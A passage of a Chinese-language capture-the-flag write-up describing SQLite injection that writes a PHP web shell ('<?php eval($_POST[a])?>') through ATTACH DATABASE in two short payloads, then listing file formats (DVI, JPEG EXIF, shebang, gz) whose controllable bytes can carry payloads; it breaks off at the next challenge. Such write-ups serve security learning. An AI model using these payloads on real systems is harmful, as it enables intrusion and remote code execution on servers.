enSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png" alt=""></p><p>发现这里被吃掉了一个<code>p</code>，于是我们调整一下 payload 就可以用来注入了。</p><p>sqlite 是可以用 .php 文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过 sqlite attach 一个 z.php 的方法来写 shell 了。</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/*</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE 'z.php' AS t;insert INTO t.e (d) VALUES ('&lt;?php eval($_POST[a])?&gt;');/*</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里可能需要注意的就是有长度限制，所以我们需要分两次来写 shell</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png" alt=""></p><h3 id="other-file"><a href="#other-file" class="headerlink" title="other file"></a>other file</h3><p>看其他选手的公开的 wp 也是很有趣的一件事，然后从 ctftime 上公开的 wp，我们可以发现还存在着这么一些文件可以用来注入。</p><h4 id="TeX-DVI-file"><a href="#TeX-DVI-file" class="headerlink" title="TeX DVI file"></a>TeX DVI file</h4><p>0xf702 文件头，在填充一定数据后有我们完全可控的数据</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png" alt=""></p><h4 id="jpeg"><a href="#jpeg" class="headerlink" title="jpeg"></a>jpeg</h4><p>在 jpeg 的 EXIF 数据段中有用来标识 software 的数据也是我们可控的地方，同样用来标识 comment 的地方我们也可控。于是我们可以使用 exiftool 来修改图片。</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="hljs-string">"payload"</span> -software=<span class="hljs-string">"payload2"</span> 1.jpg</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png" alt=""></p><h4 id=""><a href="#" class="headerlink" title="#!"></a>#!</h4><p>我们还可以利用<code>#!/</code>的文件来构造 payload</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png" alt=""></p><h4 id="gz"><a href="#gz" class="headerlink" title="gz"></a>gz</h4><p>利用<code>gunzip</code>生成的 gz 文件，我们也可以用来注入，我们可控的数据是它的文件名</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://posts.xh4h.com/assets/images/36c3/gunzip1.png" alt=""></p><p>当然我们也可以直接修改 gz 文件内容</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png" alt=""></p><h2 id="WriteUpBin"><a href="#WriteUpBin" class="headerlink" title="WriteUpBin"></a>WriteUpBin</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:13/321</p><p><strong>Points</strong>: round(1000 · min(1, 10 / (9 + [13 solves]))) = 